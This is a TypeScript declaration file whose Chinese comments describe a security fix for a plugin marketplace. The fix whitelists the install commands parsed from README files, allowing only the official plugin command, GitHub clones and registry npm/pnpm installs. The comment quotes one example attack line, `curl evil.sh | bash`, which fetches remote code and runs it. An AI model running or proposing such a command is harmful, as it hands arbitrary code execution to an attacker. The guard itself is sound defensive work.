/**
 * T0 直装命令白名单（issue #165 安全修复）。
 *
 * 背景：T0 直装在宿主进程以用户全部权限执行 README/配方解析出的命令
 * （Win32 cmd /d /s /c，POSIX sh -c，无沙箱）。此前任意命令原样执行——
 * 一个恶意仓库在 README 写一句 `curl evil.sh | bash` 即可完成
 * 「市场点击 → 任意代码执行」，且 ruflo 事故中实际发生了。
 *
 * 这里用「白名单」而非「黑名单」：只放行结构受限、可预期的命令形态，
 * 其余一律拒绝直装（needAi 升级 T1 复核，或转人工/安全模式）。
 *
 * 放行形态：
 * - `dsh plugin [--profile <p>] add <pkg>`           官方安装命令（与内置路径同款）
 * - `git clone https://github.com/<owner>/<repo>`    仅限插件自身仓库；目标不允许 ~ 与 ..，
 *                                                    绝对路径仅允许目标技能目录（规范化改写产物）
 * - `npm install|i <pkg>` / `pnpm add|install <pkg>` 非全局；包名仅限 registry 形态（拒 URL/git 源/路径）
 */
import type { DshPlugin } from "@dsh-market/schema";
export interface BlockedCommand {
    command: string;
    reason: string;
}
export interface GuardResult {
    ok: boolean;
    blocked: BlockedCommand[];
}
export interface GuardOptions {
    /** 允许的绝对路径前缀（git clone 目标）：传 cfg.skillsDir，规范化改写后的克隆目标才可放行 */
    allowedDestPrefix?: string;
}
export declare function guardInstallCommands(plugin: Pick<DshPlugin, "fullName">, commands: string[], opts?: GuardOptions): GuardResult;
